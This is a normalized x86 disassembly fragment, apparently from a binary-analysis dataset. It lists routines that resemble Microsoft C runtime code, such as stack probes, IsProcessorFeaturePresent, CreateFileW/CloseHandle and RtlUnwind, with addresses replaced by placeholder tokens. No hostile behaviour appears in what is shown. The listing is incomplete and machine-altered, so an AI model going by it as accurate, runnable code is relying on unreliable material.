call sub_40e84e
add esp 0x10
pop ebp
retn
sub_40ebb8
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ea6c
add esp 0x10
pop ebp
retn
sub_40ecc9
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_40ec00
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_40ed14
call eax
retn
sub_40edd1
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_40ef37
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_40eee4
add esp 0x10
pop ebp
retn
sub_40f11f
push 0x2
call sub_406073
sub_40f130
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40dba0
sub_40f146
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_40dba0
sub_40f15c
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_40f17b
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_40f81a
mov [ ecx ] r--data
jmp sub_405ae9
sub_40f978
push [ ebp - 0x14 ]
call sub_40f8ab
pop ecx
retn
sub_40f9bc
call sub_407dbd
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_407dbd
dec [ eax + 0x90 ]
sub_40fa5e
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_40fa67
mov esp [ ebp - 0x18 ]
call sub_40c1cb
sub_40fb14
push 0x4
mov eax sub_410989
call sub_41054c
call sub_407dbd
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_40c204
call sub_40c217
sub_40fbed
mov eax [ ebp - 0x14 ]
call sub_40f9d6
retn
sub_40fe64
xor eax eax
inc eax
retn
sub_40fe68
mov esp [ ebp - 0x18 ]
call sub_40c1cb
sub_40fefd
xor eax eax
inc eax
retn
sub_40ff01
mov esp [ ebp - 0x18 ]
call sub_40c1cb
sub_4103f4
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_405b1b
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_410582
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_41091b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x11e0 ]
xor ecx eax
call sub_4042ed
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_4042ed
mov eax r--data
jmp sub_40f4c3
sub_410950
lea ecx [ ebp - 0x1550 ]
jmp sub_403ce0
sub_41095b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x1574 ]
mov ecx [ edx - 0x1578 ]
xor ecx eax
call sub_4042ed
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_4042ed
mov eax r--data
jmp sub_40f4c3
sub_410989
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4042ed
mov eax r--data
jmp sub_40f4c3
sub_4109a4
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_405ae9
